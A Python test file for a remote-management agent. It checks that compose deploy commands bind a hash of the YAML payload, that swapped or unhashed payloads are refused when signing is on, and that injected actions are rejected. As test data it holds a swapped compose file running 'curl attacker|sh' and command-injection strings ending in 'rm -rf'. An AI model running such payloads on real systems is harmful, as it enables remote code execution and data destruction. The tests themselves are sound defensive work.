#!/usr/bin/env python3
"""compose_deploy was signed on the stack id, not on the compose file it runs.

`require-signed-commands` signs the COMMAND STRING. The command was
`compose_deploy:<action>:<stack_id>`, and the agent then fetched the yaml in a
separate call and ran `docker compose` on it. So the signature covered an
identifier while the only thing that actually executes travelled unsigned.

That is the exact case the setting exists for: anything that can reach the
command queue — a compromised server above all — could leave a previously
signed command in place and change the compose file behind it.

The server now binds a hash of the yaml into the command and the agent re-hashes
what it fetched. With signing OFF a missing hash is accepted (no guarantee is
being claimed, and an older server omits it). With signing ON a missing hash is
REFUSED, because tolerating it would let an attacker simply omit it.
"""
import hashlib
import importlib.util
import re
import unittest
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
_AGENT = _ROOT / 'client' / 'remotepower-agent.py'
_SRV = _ROOT / 'server' / 'cgi-bin' / 'apps_compose_handlers.py'


def _agent():
    spec = importlib.util.spec_from_loader(
        'rp_agent_compose_bind',
        importlib.machinery.SourceFileLoader('rp_agent_compose_bind', str(_AGENT)))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


class TestTheServerBindsThePayload(unittest.TestCase):

    def setUp(self):
        self.src = _SRV.read_text()

    def test_both_queue_sites_carry_a_hash(self):
        sites = re.findall(r"f'compose_deploy:\{action\}:\{stack_id\}([^']*)'",
                           self.src)
        self.assertEqual(2, len(sites), f'expected 2 queue sites, got {sites}')
        for suffix in sites:
            self.assertEqual(':{_yh}', suffix,
                             'a queue site still sends the bare stack id')

    def test_the_hash_is_over_the_yaml_that_will_run(self):
        """Hashing the wrong variable binds nothing. One site has the yaml in a
        local, the other has to read it back off the stored stack."""
        self.assertIn("A.hashlib.sha256((yaml or '')", self.src)
        self.assertIn("A.hashlib.sha256((s.get('yaml') or '')", self.src)

    def test_the_status_regex_accepts_the_new_form(self):
        """The agent echoes the full command back and the server matches it to
        update the stack. A regex anchored on the old shape would leave every
        deploy stuck on 'deploying'."""
        api_src = (_ROOT / 'server' / 'cgi-bin' / 'api.py').read_text()
        m = re.search(r"compose_match = re\.match\(\s*r'([^']+)'", api_src)
        self.assertTrue(m, 'the status regex moved')
        rx = re.compile(m.group(1))
        self.assertTrue(rx.match('compose_deploy:up:s-abc123:' + 'a' * 32))
        self.assertTrue(rx.match('compose_deploy:up:s-abc123'),
                        'a pre-7.0.2 agent echoing the old form must still '
                        'update its stack')
        self.assertFalse(rx.match('compose_deploy:up:s-abc123:zz;rm -rf /'))


class TestTheAgentVerifiesIt(unittest.TestCase):

    def setUp(self):
        self.m = _agent()
        self.yaml = 'services:\n  web:\n    image: nginx\n'
        self.good = hashlib.sha256(self.yaml.encode()).hexdigest()[:32]
        self.fetched = {'ok': True, 'name': 'web', 'yaml': self.yaml}
        self.m.load_credentials = lambda: {
            'server_url': 'https://x', 'device_id': 'd1', 'token': 't'}
        self.m.http_post = lambda url, body: self.fetched
        self.m._which = lambda p: '/usr/bin/' + p
        self.ran = []
        self.m.subprocess = type('S', (), {
            'run': staticmethod(lambda *a, **k: type(
                'R', (), {'returncode': 0, 'stdout': 'ok', 'stderr': ''})()),
            'TimeoutExpired': Exception})
        self.m._require_signed_commands = lambda: False
        # The real COMPOSE_STACKS_DIR is /var/lib/remotepower/stacks; writing
        # there fails on a dev box and the resulting rc -1 looks exactly like a
        # refusal, which is what the positive control is trying to rule out.
        import tempfile
        self.m.COMPOSE_STACKS_DIR = Path(tempfile.mkdtemp(prefix='rp-stk-'))

    def _run(self, cmd):
        return self.m._run_compose_deploy(cmd)

    def test_a_matching_hash_is_accepted(self):
        """Positive control. Everything below asserts a refusal, and a function
        that refused everything would satisfy all of it."""
        r = self._run(f'compose_deploy:up:s-abc:{self.good}')
        self.assertNotIn('refused', r['output'])
        self.assertNotEqual(-1, r['rc'], r['output'])

    def test_a_swapped_payload_is_refused(self):
        self.fetched['yaml'] = ('services:\n  x:\n    image: evil\n'
                                '    command: curl attacker|sh\n')
        r = self._run(f'compose_deploy:up:s-abc:{self.good}')
        self.assertEqual(-1, r['rc'])
        self.assertIn('does not match', r['output'])

    def test_a_missing_hash_is_tolerated_when_signing_is_off(self):
        """An older server omits it and claims no guarantee."""
        r = self._run('compose_deploy:up:s-abc')
        self.assertNotIn('refused', r['output'])

    def test_a_missing_hash_is_refused_when_signing_is_on(self):
        """Tolerating it here would let an attacker simply leave it out."""
        self.m._require_signed_commands = lambda: True
        r = self._run('compose_deploy:up:s-abc')
        self.assertEqual(-1, r['rc'])
        self.assertIn('no payload hash', r['output'])

    def test_a_matching_hash_still_works_when_signing_is_on(self):
        self.m._require_signed_commands = lambda: True
        r = self._run(f'compose_deploy:up:s-abc:{self.good}')
        self.assertNotIn('refused', r['output'])

    def test_a_malformed_command_is_still_rejected(self):
        for bad in ('compose_deploy', 'compose_deploy:up'):
            with self.subTest(cmd=bad):
                self.assertEqual(-1, self._run(bad)['rc'])

    def test_the_action_allowlist_still_applies(self):
        r = self._run(f'compose_deploy:rm -rf:s-abc:{self.good}')
        self.assertEqual(-1, r['rc'])
        self.assertIn('not allowed', r['output'])


class TestTheExtensionlessCopyIsInSync(unittest.TestCase):
    def test_bytes_match(self):
        self.assertEqual(_AGENT.read_bytes(),
                         (_ROOT / 'client' / 'remotepower-agent').read_bytes())


if __name__ == '__main__':
    unittest.main()
